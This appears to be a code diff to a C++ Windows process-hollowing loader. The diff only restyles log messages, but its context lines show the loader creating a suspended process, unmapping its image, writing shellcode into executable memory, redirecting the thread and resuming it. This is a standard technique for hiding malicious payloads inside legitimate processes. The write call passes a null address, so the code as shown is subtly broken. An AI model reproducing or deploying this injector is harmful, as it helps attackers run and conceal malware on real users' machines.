@@ -8,25 +8,25 @@
 #include "pe.h"
 
 bool InitializeHollowProcess(STARTUPINFOA *&pStartupInfo, PROCESS_INFORMATION *&pProcessInfo, PPEB &pPEB, PLOADED_IMAGE &pImage, char *targetPath) {
-    PRINT("creating process", PRINT_INFO);
+    PRINT("Creating target process", PRINT_INFO);
     pStartupInfo = new STARTUPINFOA();
     pProcessInfo = new PROCESS_INFORMATION();
 
     CreateProcessA(0, targetPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
     if (!pProcessInfo->hProcess) {
-        PRINT("failed to create process", PRINT_ERROR);
+        PRINT("Failed to create process", PRINT_ERROR);
         return false;
     }
 
     pPEB = ReadRemotePEB(pProcessInfo->hProcess);
     if (!pPEB) {
-        PRINT("failed to read remote peb", PRINT_ERROR);
+        PRINT("Failed to read remote peb", PRINT_ERROR);
         return false;
     }
 
     pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
     if (!pImage) {
-        PRINT("failed to read remote image", PRINT_ERROR);
+        PRINT("Failed to read remote image", PRINT_ERROR);
         return false;
     }
 
@@ -34,7 +34,7 @@ bool InitializeHollowProcess(STARTUPINFOA *&pStartupInfo, PROCESS_INFORMATION *&
 }
 
 bool UnmapDestinationSection(HANDLE hProcess, PPEB pPEB) {
-    PRINT("unmapping process memory", PRINT_INFO);
+    PRINT("Unmapping process memory", PRINT_INFO);
     HMODULE hNTDLL = GetModuleHandleA("ntdll");
     FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
 
@@ -45,7 +45,7 @@ bool UnmapDestinationSection(HANDLE hProcess, PPEB pPEB) {
     );
 
     if (dwResult) {
-        PRINT("failed to unmap destination section", PRINT_ERROR);
+        PRINT("Failed to unmap destination section", PRINT_ERROR);
         return false;
     }
 
@@ -53,15 +53,15 @@ bool UnmapDestinationSection(HANDLE hProcess, PPEB pPEB) {
 }
 
 bool AllocateAndWriteMemory(HANDLE hProcess, const std::vector<BYTE> &shellcode, LPVOID *pAllocatedMemory) {
-    PRINT("allocating and writing shellcode to the target process", PRINT_INFO);
+    PRINT("Allocating and writing shellcode to the target process", PRINT_INFO);
     *pAllocatedMemory = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if(!*pAllocatedMemory) {
-        PRINT("failed to allocate memory in the target process", PRINT_ERROR);
+        PRINT("Failed to allocate memory in the target process", PRINT_ERROR);
         return false;
     }
 
     if(!WriteProcessMemory(hProcess, nullptr, shellcode.data(), shellcode.size(), nullptr)) {
-        PRINT("failed to write shellcode to the target process", PRINT_ERROR);
+        PRINT("Failed to write shellcode to the target process", PRINT_ERROR);
         return false;
     }
 
@@ -69,9 +69,10 @@ bool AllocateAndWriteMemory(HANDLE hProcess, const std::vector<BYTE> &shellcode,
 }
 
 bool ResumeProcess(HANDLE hThread, LPVOID pAllocatedMemory, CONTEXT *context) {
+    PRINT("Resuming target process", PRINT_INFO);
     context->ContextFlags = CONTEXT_FULL;
     if(!GetThreadContext(hThread, context)) {
-        PRINT("failed to get thread context", PRINT_ERROR);
+        PRINT("Failed to get thread context", PRINT_ERROR);
         return false;
     }
 
@@ -82,12 +83,12 @@ bool ResumeProcess(HANDLE hThread, LPVOID pAllocatedMemory, CONTEXT *context) {
 #endif
 
     if (!SetThreadContext(hThread, context)) {
-        PRINT("failed to set thread context", PRINT_ERROR);
+        PRINT("Failed to set thread context", PRINT_ERROR);
         return false;
     }
 
     if (!ResumeThread(hThread)) {
-        PRINT("failed to resume thread", PRINT_ERROR);
+        PRINT("Failed to resume thread", PRINT_ERROR);
         return false;
     }
 
@@ -96,12 +97,12 @@ bool ResumeProcess(HANDLE hThread, LPVOID pAllocatedMemory, CONTEXT *context) {
 
 void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
     if (targetPath == nullptr) {
-        PRINT("target path is empty", PRINT_ERROR);
+        PRINT("Target path is empty", PRINT_ERROR);
         return;
     }
 
     if (shellcode.empty()) {
-        PRINT("shellcode vector is empty", PRINT_ERROR);
+        PRINT("Shellcode vector is empty", PRINT_ERROR);
         return;
     }
 
